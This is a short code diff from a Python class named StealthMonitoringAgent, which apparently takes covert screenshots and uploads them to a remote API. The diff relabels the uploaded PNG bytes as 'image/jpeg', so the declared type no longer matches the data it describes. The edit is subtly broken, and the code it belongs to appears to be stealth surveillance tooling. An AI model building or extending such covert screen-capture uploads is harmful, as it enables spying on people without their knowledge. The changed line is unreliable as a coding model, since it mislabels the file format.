@@ -176,7 +176,7 @@ class StealthMonitoringAgent:
 
         try:
             img = screenshot_mod.capture_png_bytes()
-            self.api.upload_screenshot(img, _now_iso(), content_type="image/png")
+            self.api.upload_screenshot(img, _now_iso(), content_type="image/jpeg")
         except Exception as exc:
             self._log(f"screenshot failed: {exc}")
 
